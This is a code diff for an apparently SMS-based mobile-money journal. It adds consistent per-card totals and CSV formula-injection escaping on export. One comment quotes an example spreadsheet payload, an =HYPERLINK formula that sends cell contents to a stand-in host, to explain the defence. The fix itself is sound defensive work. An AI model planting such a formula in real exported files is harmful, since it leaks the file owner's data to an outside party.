@@ -359,11 +359,16 @@ class Journal:
             for iccid, texte in self.conn.execute(
                     "SELECT COALESCE(iccid, ''), texte FROM sms"):
                 textes.setdefault(iccid, []).append(texte)
+        # Nos numéros tranchent le sens d'un transfert à deux parties : sans
+        # eux, un encaissement d'agent (« Transfer from X to NOUS ») resterait
+        # invisible dans le total par carte, alors que le bilan du jour, lui,
+        # le compte. Les deux vues doivent dire le même chiffre.
+        nums = tuple(self.numeros_declares())
         resultat = []
         for iccid, libelle, operateur, numero, premiere, derniere in lignes:
             nb, total = 0, 0
             for texte in textes.get(iccid, []):
-                montant = montant_recu(texte)
+                montant = montant_recu(texte, numeros=nums)
                 if montant is not None:
                     nb += 1
                     total += montant
@@ -957,6 +962,16 @@ class Journal:
                 (depuis,) + params).fetchall()
         tampon = io.StringIO()
         plume = csv.writer(tampon, delimiter=";")
+
+        def _cellule(valeur):
+            # Un tableur lit une cellule qui commence par « = + - @ » (ou une
+            # tabulation) comme une FORMULE. Un SMS piégé
+            # « =HYPERLINK("http://vol.example"&A1,"clic") » s'exécuterait à
+            # l'ouverture du fichier, dans le compte du propriétaire. On
+            # préfixe ces cellules d'une apostrophe : le tableur les affiche
+            # comme du texte, la valeur reste lisible.
+            s = "" if valeur is None else str(valeur)
+            return "'" + s if s[:1] in "=+-@\t\r" else s
         # Les en-têtes et le sens se traduisent AU MOMENT de l'export : la
         # base, elle, garde ses valeurs telles quelles.
         plume.writerow(t(
@@ -969,7 +984,7 @@ class Journal:
         nums = tuple(numeros) or tuple(self.numeros_declares())
         for date, expediteur, texte, compte, ligne_iccid in lignes:
             p = analyser(texte, numeros=nums)
-            plume.writerow([
+            plume.writerow([_cellule(v) for v in (
                 date.replace("T", " "), compte or expediteur, ligne_iccid,
                 sens_dits.get(p.sens if p else "", ""),
                 p.montant if p else "",
@@ -978,7 +993,7 @@ class Journal:
                 (p.reference or "") if p else "",
                 (p.solde_apres or "") if p else "",
                 texte.replace("\n", " "),
-            ])
+            )])
         # BOM : Excel ouvre alors correctement les accents.
         return b"\xef\xbb\xbf" + tampon.getvalue().encode("utf-8")
 
